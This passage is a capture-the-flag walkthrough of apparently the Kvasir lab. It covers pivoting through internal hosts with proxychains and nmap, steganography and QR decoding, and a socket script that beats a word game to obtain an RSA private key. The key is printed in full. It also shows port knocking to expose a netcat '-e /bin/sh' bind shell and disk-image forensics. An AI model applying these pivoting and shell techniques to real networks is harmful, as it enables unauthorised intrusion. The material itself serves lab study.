<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Thu Sep  4 09:20:00 2014
celes@dev1:~$
```</p>

<h2>finding terras secret</h2>

<p>Ok lets take a moment and make sure I know where I am in the network. The newly accessed server is denoted in red:</p>

<p><img class="<a" src="href="https://i.imgur.com/nXpoEBM.png">https://i.imgur.com/nXpoEBM.png</a>"></p>

<p>I don’t have connectivity directly to <strong>192.168.3.40</strong> at the moment, but if I really need that I can arrange it. For now, lets see what we have on <code>dev1</code>.</p>

<p>First, I find the sneaky ftp session script <code>getLogs.py</code>, that does exactly that which I saw in the packet captures. Next, I find a message in <code>celes</code> mailbox:</p>

<p>```bash
celes@dev1:~$ cat /var/spool/mail/celes
Return-path: &lt;celes@localhost>
Received: from celes by localhost with local (Exim 4.80)</p>

<pre><code>(envelope-from &lt;celes@localhost&gt;)
id 1XHczw-0000V2-8y
for celes@127.0.0.1; Wed, 13 Aug 2014 19:10:08 +0100
</code></pre>

<p>Date: Wed, 13 Aug 2014 19:10:08 +0100
To: <a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#99;&#x65;&#108;&#101;&#115;&#64;&#49;&#x32;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#x31;">&#x63;&#101;&#x6c;&#101;&#115;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#49;</a>
Subject: Reminder
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: &lt;E1XHczw-0000V2-8y@localhost>
From: celes@localhost</p>

<p>Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine&hellip; <em>sigh</em>
```</p>

<p>The message reveals that Terra has a puzzle on her machine (<strong>192.168.3.50</strong> from <code>/etc/hosts</code> on the <code>db</code> server?). She also mentions <code>kvasir.png</code>, which happens to be in <code>celese</code> home directory:</p>

<p><code>bash
celes@dev1:~$ ls -lah kvasir.png
-rw-r--r-- 1 celes celes 103K Sep  3 22:16 kvasir.png
</code></p>

<p>Lastly, the <code>.bash_history</code> for <code>celese</code> has a entry <code>stepic --help</code>. <code>stepic</code> is a steganography tool. So, it seemed pretty clear what needs to be done here. My guess was that kvasir.png has a piece of the puzzle that is on Terra&rsquo;s machine. So, I converted the <code>kvasir.png</code> image to hex, and copy pasted the output on my attacking machine into a text file and converted it back to a image using <code>xxd -r -p kvasir.png.xxd &gt; kvasir.png</code>.</p>

<p><img class="<a" src="href="https://i.imgur.com/DKIbriL.png">https://i.imgur.com/DKIbriL.png</a>"></p>

<h3>getting stepic to play nice</h3>

<p>With the image ready, I searched for <code>stepic</code> using <code>pip</code> in my virtual env and installed it:</p>

<p>```bash
(kvasir)root@kali:~# pip install stepic
Downloading/unpacking stepic
  Downloading stepic-0.4%7ebzr.tar.gz
  Running setup.py egg_info for package stepic</p>

<p>Installing collected packages: stepic
  Running setup.py install for stepic</p>

<pre><code>changing mode of build/scripts-2.7/stepic from 644 to 755

changing mode of /root/kvasir/bin/stepic to 755
</code></pre>

<p>Successfully installed stepic
Cleaning up&hellip;
```</p>

<p>However, <code>stepic</code> was not just a case of plug and play for me. <strong>NOPE</strong>:</p>

<p>```bash
(kvasir)root@kali:~# stepic
Traceback (most recent call last):
  File &ldquo;/root/kvasir/bin/stepic&rdquo;, line 24, in <module></p>

<pre><code>import Image
</code></pre>

<p>ImportError: No module named Image
```</p>

<p>Long story short, a small hack and installation of another dependency finally got it working for me:</p>

<p>```bash
(kvasir)root@kali:~# pip install pillow
Downloading/unpacking pillow
  Downloading Pillow-2.6.1.tar.gz (7.3Mb): 7.3Mb downloaded
  Running setup.py egg_info for package pillow</p>

<pre><code>Single threaded build, not installing mp_compile: 1 processes
</code></pre>

<p>[&hellip; snip &hellip;]</p>

<pre><code>*** OPENJPEG (JPEG2000) support not available
--- ZLIB (PNG/ZIP) support available
</code></pre>

<p>[&hellip; snip &hellip;]</p>

<p>Successfully installed pillow
Cleaning up&hellip;
```</p>

<p>The final hack was to change the installed <code>stepic</code> bin at <code>/root/kvasir/bin/stepic</code> line 24 from <code>import Image</code> to <code>from PIL import Image</code>. Finally, <code>stepic</code> was working fine.</p>

<h3>finding the secret</h3>

<p>With <code>stepic</code> up and running, I was finally able to run it against the image <code>kvasir.png</code>:</p>

<p>```bash
(kvasir)root@kali:~# stepic &mdash;decode &mdash;image-in=kvasir.png &mdash;out=out</p>

<h1>check the file type we got out</h1>

<p>root@kali:~# file out
out: ASCII text, with very long lines, with no line terminators</p>

<h1>check the output we got</h1>

<p>root@kali:~# cat out
89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5
445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec90544
22304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be
559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e
7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e
215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae5
55e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d
97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88
df9bb4ae0a3dc20000000049454e44ae426082
```</p>

<p>At this stage I was pretty convinced my hacks to get <code>stepic</code> to work failed. I am also not really sure what to expect as output so that made it even harder to know if I had something to work with there.</p>

<p>Close study of the output string though got me started in trying to determine what this was that I had. My method involved me invoking a python shell and trying a bunch of <code>decode()</code> methods on it. I just took the first few characters of the output to play with as some decodings need specific string lengths etc:</p>

<p>```bash
root@kali:~# python
Python 2.7.3 (default, Mar 14 2014, 11:57:14)
[GCC 4.7.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>&ldquo;89504e470d0a1a0a000000&rdquo;.decode(&ldquo;hex&rdquo;)
&lsquo;\x89PNG\r\n\x1a\n\x00\x00\x00&rsquo;</p>

<p>```</p></blockquote></blockquote></blockquote>

<p>Decoding it as <code>hex</code> revealed the part I needed to see&hellip; <code>PNG</code>! So this string was a hex encoded PNG image (unless thats a troll too&hellip;). I took <code>out</code> and reversed it using <code>xxd -r -p</code>:</p>

<p><code>bash
root@kali:~# xxd -p -r out &gt; kvasir2.png
root@kali:~# file kvasir2.png
kvasir2.png: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
</code></p>

<p>Lets see what the image looks like:</p>

<p><img class="<a" src="href="https://i.imgur.com/r0wxCYh.png">https://i.imgur.com/r0wxCYh.png</a>"></p>

<p>A QR code! I fetched my phone and scanned it, revealing the string <code>Nk9yY31hva8q</code>. Great!&hellip; I think. Wait, what does this even mean? I got stumped again into wondering what this arb string is for that I have. It was not the root password for <code>dev1</code> either.</p>

<h2>playing Terra&rsquo;s game</h2>

<p>Without being able to place the string found in the QR code, I stepped one step back and decided to check out Terra&rsquo;s game as per the email. From the <code>/etc/hosts</code> on <code>db</code>, I saw a comment for <code>terra</code> as <strong>192.168.3.50</strong>. Using the SSH socks proxy on <code>tcp/8000</code> I setup when I setup the SSH session to <strong>192.168.2.200</strong>, I nmapped <strong>192.168.3.50</strong>.</p>

<p>```bash</p>

<h1>/etc/proxychains.conf has line</h1>

<h1>socks5    127.0.0.1 8000</h1>

<h1>scans will appear to be coming from 192.168.3.200 for</h1>

<h1>192.168.3.50</h1>

<p>root@kali:~# proxychains nmap -sT 192.168.3.50
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-09 16:31 SAST
Nmap scan report for 192.168.3.50
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
4444/tcp open  krb524</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```</p>

<p>Well <code>tcp/4444</code> looks interesting! Lets have a look!</p>

<p>```bash
root@kali:~# proxychains nc 192.168.3.50 4444
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
Hello Celes &amp; Welcome to the Jumble!</p>

<p>Solve:indrssoses
Solve:roneb bob
Solve:abaerrbs</p>

<p>[&hellip; snip &hellip;]</p>

<p>Solve:iepasncm</p>

<p>Score: 0
Time: 22.71 secs
Just a bit embarrasing really&hellip;
```</p>

<p>Don&rsquo;t think I did too well there! :D Not to fear. I recognized some of the strings after the <em>Solve:</em> as ones that are scrambled from the previously found <code>.words.txt</code> file. So, my guess here was that I had to write a small script that will connect to the socket and answer with the unscrambled versions from <code>.words.txt</code>. With the <code>.words.txt</code> file locally available, I slapped together something to try and do this:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Kvasir Terra Puzzle Solver</h1>

<p>import sys
import socket
import base64</p>

<h1>read the words.txt we got into a list</h1>

<p>with open(&lsquo;words.txt&rsquo;) as f:</p>

<pre><code>words = f.read().splitlines()
</code></pre>

<h1>connection to the game</h1>

<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((&lsquo;192.168.3.50&rsquo;, 4444))</p>

<h1>start processing the lines</h1>

<p>while True:</p>

<pre><code># receive a frame large enough
frame = sock.recv(150)

# check that its a question frame
if 'Solve' not in frame:
    print "[!] 'Solve' not in frame. Game over?"
    break

# split the frame with :
frame = frame.split(':')
if len(frame) &lt; 2:
    print "[!] Was unable to split by :. Game over?"
    break

question = frame[1].strip()

# @barrebas suggested a length check too to increase probability :)
result = [s for s in words if not s.strip(question) and len(question) == len(s)]
#result = [s for s in words if not s.strip(question)]

if len(result) &lt; 1:
    print "[!] Was unable to match anything to %s" % question
    continue

answer = result[0].strip()

print "[+] Matched %s to %s" % (question, answer)
sock.send(answer)
</code></pre>

<h1>did we win? \:D/</h1>

<p>if &lsquo;You\&rsquo;re a winner&rsquo; in frame:</p>

<pre><code>print "[+] We won!"

# read the rest of the socket output
frame += sock.recv(2500)

# base64 decode the last string
print "[+] Extracing and decoding the base64 section"
print base64.b64decode(frame.split('\n')[-1])
sys.exit(0)
</code></pre>

<p>sock.close</p>

<h1>work with what we have left</h1>

<p>print &ldquo;[+] Last frame was:\n %s&rdquo; % frame
print &ldquo;[+] Done&rdquo;
sys.exit(0)
```</p>

<p>Once you are able to get a score of 120 it seems, you are considered a winner. Once you have won, a fairly large string is output again. This string appeared to be a base64 encoded string, and as a result, I added the <code>base64.b64decode(frame.split('\n')[-1])</code> section to the script so that if you win it will print the cleartext version.</p>

<p>The script is not perfect. Sometimes you don’t get 120 as a score and have to run it again. But, within a reasonable amount of attempts you are able to beat the game. A sample run would be:</p>

<p>```bash
root@kali:~# proxychains ./play.py
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
[+] Matched atravdeii to radiative
[+] Matched oilyaerbdmpn to imponderably</p>

<p>[&hellip; snip &hellip;]
[+] Matched idmlhkeir to kriemhild
[!] &lsquo;Solve&rsquo; not in frame. Game over?
[+] We won!
[+] Extracing and decoding the base64 section
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D</p>

<p>OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
```</p>

<p>A private key? Encrypted though :( Remembering the string I got from the QR code earlier that had no affiliation to anything yet, I tried that as the password to decrypt:</p>

<p>```bash
root@kali:# openssl rsa -in terra_key -out terra_key_nopass
Enter pass phrase for terra_key: # entered Nk9yY31hva8q
writing RSA key</p>

<p>root@kali:~# cat terra_key_nopass
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
MIIEpAIBAAKCAQEAyekXwhcscSSzT3vw5/eL2h1Bb55vEIOOAkQpIQQ/ldnyT6Yt
w0dAaN71JidjfojzvdaZRNrRY5wkdHUr2t93TJx8vKDZ+n5up4nCKle3p2sz2hKP
DhP7LvxkVTM7Io3qoAYXefggTOWvfoK8X8pXE3xAdIyF4uCXmDjeg6UKoCr5XiWP
12YQEODLd+tp9RH4R/rCaencsNsta45sY1NXtWuJje4HVkPV8ei04ce8SP5PwVhV
sfp2Hxr8g4IKn7ZTwtmkD1SuvmZoyDHNAsToqFt2RiVE9yLQj94Gcagx7PqUijeH
b+4T+6tuDZtjgct4RdYZejnUOYx+iHiSjl6xCQIDAQABAoIBADYOi+fQ4HsiQkeD
fUn9gpnQv1Ys6rtXHUwKB6DpTETIZxFgAlyH1Py+xI+EeCTGcctfiwVeODUc9r2f
KTCeJ4iBVPwDbJieBO4h+bPwbCEMmINH+LjiLJu1wv70il6D9E8Hkn17Ktqrm8KZ
KenTeGClIXSSsr29N5jvkNNZ+nBK116l2TNNSsiWGc3VnezgCuRnDMSuKmA4P/OD
5F/h2/1sC33P1P5zxSMMsUZbm616AXNdv2DxHYm5b7p0L3/wzpZaJ+ZCp9jutbMO
P7XADZrFSn1EOk9blfVQz77GhRUVAotXKv7Jj4x+zHjq2l3n2Jk5RwJLl8iw4vZ+
ActgrskCgYEA5RhweA1naUanRJtlnLY4ywjfpZffPOZovmthqeOYdSJmwdmKvf08
bBR7hRwwlwgD92jeZWC1nK2zjwVpVQqV3sq4+x6Yspp0T5d9hp7PqUvPGglRdPXX
JQjMBV/Q2fK+ydnTz3xImjIvGsoFya9B/COKicu5ugCklCxtdNPJd/8CgYEA4Z9c
cekfgeha7sYe202krz0m03b8IqFaEMBUkEDmr8+RTL2H+9ciu3/2y/0UJ20w3qwe
gWv2OvOmumJ2wi/HVQdoQ9purzKWDdes6QrQsZ6+4eeylQmVmBSOF9YiVudSwyBM
+2rmE4m4qAIVidIJskb6DpB+fxDU1iWFLHlUFvcCgYEArxV8buOfkp+CmjZA9AF3
agQAGCf3Xi2hA1ZBr3rXOz3tVl0RYZ21ncwRkms231Yq4dxtiwDcCz/dKIK0O1/5
pek8cf6yKF1OYr2eG1In1nSvdHCGpmJz6EPO2JSfotGX6d/ltn5/ZgjQYyLeRYMB
ZNcsu57M9FAld3B0voJVSLUCgYACac72VPUGUbLvTOU1mU4CpdfNeT9XK3yoIzaE
WH1fMgwu0vQqaHGxqbu9ENbvWQalyxeEcOAwXzzQT49Pom0yZqLh3utCKntaaI0r
7Pawf68xAWZym6ii+M1QSfUSEuVauvS317vgR5/XBDaww7Ng2cuA7mC8ATUVmU8k
W6PfnwKBgQCBapB8OxxeRoFlnctafkTqtlNU5MGgiUGCCk/NNpDJhzaBuSdxdbRB
bQ6OJjQ9fbjF24w1iOJCGTtMQ0fxer7oxoM8TblM/eYx3Dg6MwsVApP75VdqzSas
mlJnXivwgJkeju+L42BMEl4UaxuhFPBSNCmlLBPj3Hdgyh5LSyIKmw==
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
```</p>

<p>Considering that <strong>192.168.3.50</strong> was named as <code>terra</code> in that <code>/etc/hosts</code> file, I attempted authentication using this key on it:</p>

<p>```bash
root@kali:~# proxychains ssh -D 8001 <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#x74;&#x65;&#114;&#114;&#97;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#51;&#x2e;&#x35;&#48;">&#116;&#x65;&#x72;&#114;&#x61;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#51;&#x2e;&#53;&#48;</a> -i terra_key_nopass
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
Linux dev2 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Nov  9 07:13:31 2014 from 192.168.3.200
terra@dev2:~$
```</p>

<p>As you can see, I also opened another socks proxy locally on port <code>tcp/8001</code> in the case for any further pivoting needs. Again, to make sure we understand where in the network we are, consider the following diagram, with the path to <code>dev2</code> in red:</p>

<p><img class="<a" src="href="https://i.imgur.com/Pt8SFVJ.png">https://i.imgur.com/Pt8SFVJ.png</a>"></p>

<h2>letting myself in via the back door</h2>

<p>Enumerating <code>dev2</code> did not reveal much interesting information. In fact, the most important clue found was in a mail for <code>terra</code> from Locke:</p>

<p>```bash
terra@dev2:~$ cat /var/spool/mail/terra
Return-path: <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x6c;&#x6f;&#x63;&#107;&#101;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#52;&#46;&#x31;&#x30;&#x30;">&#x6c;&#x6f;&#99;&#107;&#101;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#52;&#x2e;&#49;&#48;&#x30;</a>
Received: from locke by 192.168.4.100 with local (Exim 4.80)
~       (envelope-from &lt;locke@adm>)
~       id 1XHczw-0000V2-8y
~       for terra@192.168.3.50; Wed, 13 Aug 2014 19:10:08 +0100</p>

<p>Date: Wed, 13 Aug 2014 19:10:08 +0100
To: <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#x74;&#101;&#x72;&#114;&#x61;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#x33;&#x2e;&#53;&#x30;">&#x74;&#x65;&#114;&#x72;&#x61;&#64;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x33;&#x2e;&#x35;&#x30;</a>
Subject: Port Knock
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: &lt;E1XHczw-0000V2-8y@adm>
From: <a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#108;&#x6f;&#x63;&#x6b;&#101;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x34;&#x2e;&#49;&#48;&#x30;">&#108;&#111;&#99;&#x6b;&#x65;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x34;&#x2e;&#x31;&#x30;&#x30;</a>
~
Hi Terra,</p>

<p>I&rsquo;ve been playing with a port knocking daemon on my PC &ndash; see if you can use that to get a shell.
Let me know how it goes.</p>

<p>Regards,
Locke
```</p>

<p>Port knocking daemon eh? Admittedly at this stage again I was kinda stuck. Did I miss the sequence to knock on my way here? While wondering about this, I setup to run a port scan on <strong>192.168.4.100</strong></p>

<p>```bash</p>

<h1>/etc/proxychains.conf has line</h1>

<h1>socks5    127.0.0.1 8001</h1>

<h1>scans will appear to be coming from 192.168.4.50 for</h1>

<h1>192.168.4.100</h1>

<p>root@kali:~# proxychains nmap -sT 192.168.4.100
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-09 17:39 SAST
Nmap scan report for 192.168.4.100
Host is up (0.0018s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
```</p>

<p>Only <code>tcp/22</code>. :s</p>

<p>I started working back a little bit to some of the previous machines in search for clues, but, found nothing concrete. Remembering the port knocking daemon used in <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a> (<code>knockd</code>), I went and searched for its configuration file, looking for the default port sequence it is configured with. I found the config file <a href="https://github.com/jvinet/knock/blob/master/knockd.conf">here</a>, which revealed the default sequence of: <code>7000,8000,9000</code>. So, I tested this by attempting to connect with <code>nc</code> to these ports on <strong>192.168.4.100</strong>, and following up with a nmap:</p>

<p><code>bash
terra@dev2:~$ nc -v 192.168.4.100 7000 -w 1; nc -v 192.168.4.100 8000 -w 1; nc -v 192.168.4.100 9000 -w 1
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 7000 (afs3-fileserver) : Connection refused
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 8000 (?) : Connection refused
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 9000 (?) : Connection refused
terra@dev2:~$
</code></p>

<p>The nmap after the knock:</p>

<p>```bash
root@kali:~# proxychains nmap -sT 192.168.4.100
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-09 17:45 SAST
Nmap scan report for 192.168.4.100
Host is up (0.0015s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1111/tcp open  lmsocialserver</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds</p>

<p>```</p>

<p>A new port! <code>tcp/1111</code> :) Lets check it out.</p>

<p>```bash
root@kali:~# proxychains nc 192.168.4.100 1111
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</p>

<h1>a new connection has no output. Only after typing</h1>

<h1>&lsquo;crap&rsquo; do you realise you have a sh session open</h1>

<p>id
uid=1000(locke) gid=1000(locke) groups=1000(locke)
```</p>

<p>Shell access as <code>locke</code> on <strong>192.168.4.100</strong>. Nice :D To help me ensure I can comprehend where I am in the network, consider the following diagram, which is turning into a mess thanks to how deep this whole is&hellip; The new connection denoted in red again:</p>

<p><img class="<a" src="href="https://i.imgur.com/u2klDxc.png">https://i.imgur.com/u2klDxc.png</a>"></p>

<h2>busting kefka</h2>

<p>The shell on <code>adm</code> as <code>locke</code> was nothing more than a <code>/bin/sh</code> instance executed over <code>netcat</code>. This can be seen in the <code>littleShell.sh</code> file in <code>/home/locke</code>:</p>

<p>```bash
cat littleShell.sh</p>

<h1>!/bin/sh</h1>

<p>/bin/nc -lnp 1111 -e &lsquo;/bin/sh&rsquo;
```</p>

<p>Other interesting files were all in <code>locke</code>&rsquo;s home directory:</p>

<p><code>bash
pwd
/home/locke
ls -lh
total 332K
-rw-r--r-- 1 locke locke 322K Aug 10 10:32 diskimage.tar.gz
-rwxr--r-- 1 locke locke   42 Aug 13 17:59 littleShell.sh
-rw-r--r-- 1 locke locke  110 Sep  4 13:38 note.txt
</code></p>

<p>The <code>note.txt</code> file:</p>

<p><code>bash
cat note.txt
Looks like Kefka may have been abusing our removable media policy.  I've extracted this image to have a look.
</code></p>

<p>Awesome. That gives me a pretty clear idea of where this may be going. My guess was I needed to find something interesting in the <code>diskimage.tar.gz</code> file to progress. The first thing I had to do was get a local copy of <code>diskimage.tar.gz</code>. Out comes <code>netcat</code> again :) I hosted the file on <code>tcp/4444</code> on <strong>192.168.4.100</strong> with <code>nc -lvp 4444 &lt; diskimage.tar.gz | xxd -p</code>. I then read the file on my attacking machine with <code>timeout 5 proxychains nc 192.168.4.100 4444 &gt; diskimage.tar.gz</code> (I gave the file 5 seconds to come over before killing the connection, allowing my other netcat shell to stay alive).</p>

<p>I had to carve out the string <em>ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</em> out of the archive I get locally on disk due to the proxychains command adding this. Luckily it was a simple <code>dd</code> on the top line and it was gone :)</p>

<p>I then extracted the archive and ran the resultant archive through <code>file</code>:</p>

<p>```bash
root@kali:~# tar xvf diskimage.tar.gz
diskimage</p>

<p>root@kali:~# file -k diskimage
diskimage: x86 boot sector, code offset 0x3c, OEM-ID &ldquo;MSDOS5.0&rdquo;, sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes > 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit) DOS executable (COM), boot code
```</p>

<p>Ok, so this really looks like a disk image. I decided to mount it and have a look inside:</p>

<p>```bash
root@kali:~# mount diskimage /mnt/</p>

<p>root@kali:~# ls -lah /mnt/
total 21K
drwxr-xr-x  2 root root  16K Jan  1  1970 .
drwxr-xr-x 23 root root 4.0K Sep 17 13:04 ..
-rwxr-xr-x  1 root root  118 Aug  3 12:10 Secret.rar</p>

<h1>oh! a .rar? Lets extract&hellip;</h1>

<p>root@kali:~# unrar x /mnt/Secret.rar</p>

<p>UNRAR 4.10 freeware      Copyright &copy; 1993-2012 Alexander Roshal</p>

<p>Extracting from /mnt/Secret.rar</p>

<p>Enter password (will not be echoed) for MyPassword.txt:</p>

<p>No files to extract
```</p>

<p>A <code>.rar</code> archive, but no password to extract. Aaaand again, I was stuck. My guess was there was some forensics aspect to this, and that the disk image may be more than just a disk image&hellip;</p>

<p>Some googling around got me a hit on a tool called <code>autopsy</code>, which is a disk image analysis framework. I cared little for the case files features and what not, but much rather the actual analysis features. I fired up the tool from the Kali menu, and browsed to the web interface. I had a whole bunch of prompts to work through, and eventually came to a view that allowed me to inspect the disk:</p>

<p><img class="<a" src="href="https://i.imgur.com/SBIbnMU.png">https://i.imgur.com/SBIbnMU.png</a>"></p>

<p><code>C:/Funky.wav</code>. Now that is not something I saw when I had the disk mounted :D. I downloaded the file via the <em>Export</em> link, copied it to my laptop (my Kali doesnt have sound for whatever reason) and fired up the speakers to have a listen.</p>

<p>It sounded like this:</p>

<p><img class="<a" src="href="https://i.imgur.com/IbdKBKR.gif">https://i.imgur.com/IbdKBKR.gif</a>"></p>

<p>Yeah, I don&rsquo;t get it either. I was stumped for a few minutes again, until I remembered <a href="http://vulnhub.com/entry/xerxes-201,97/">Xerxes2</a>, which has a similar strange sounding file, but with a hidden message viewable via a spectrogram generated by <a href="http://www.sonicvisualiser.org/index.html">Sonic Visualizer</a>. I downloaded the app, loaded the wav file and got the spectrogram to do its thing:</p>

<p><img class="<a" src="href="https://i.imgur.com/7bxW0Xc.png">https://i.imgur.com/7bxW0Xc.png</a>"></p>

<p><em>OrcWQi5VhfCo</em>. Was this the password for the <code>.rar</code> archive?</p>

<p>```bash
root@kali:~# unrar x /mnt/Secret.rar</p>

